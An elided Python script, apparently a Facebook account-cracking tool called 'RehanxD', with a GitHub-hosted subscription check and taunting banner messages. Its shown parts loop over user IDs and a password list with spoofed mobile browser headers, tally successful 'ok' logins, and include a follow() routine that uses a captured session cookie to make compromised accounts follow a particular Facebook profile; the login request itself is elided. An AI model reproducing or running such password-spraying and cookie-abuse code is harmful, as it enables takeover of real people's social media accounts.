...
def main_apv():
    ...
    r1=requests.get("https://github.com/abubolojani/rehan/blob/main/rehan.txt").text
...
def R():
			...
			print ("\033[1m [!] Tool    : RehanxD")

			print(" [!] Subscription : \033[1;92mEnded On June 05\033[1;97m")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[Rehan]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                header = {
                    ...
                    "user-agent":"Mozilla/5.0 (Linux; Android 10; GM1917) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
                ...
                header1 = {
                    ...
                    "user-agent":"Mozilla/5.0 (Linux; Android 10; GM1917) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36 OPR/51.0.2254.150807]",
    ...
    def follow(self, session, coki):
        ...
        r = BeautifulSoup(session.get('https://m.facebook.com/AliBaloch356', cookies={'cookie': coki}).text, 'html.parser')
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print("\033[1;32m      APKA ABU JAAN XD REHAN \033[1;37m")
            ...
            print("\033[1;32m      Dont Forget Your PaPa \033[1;37m")
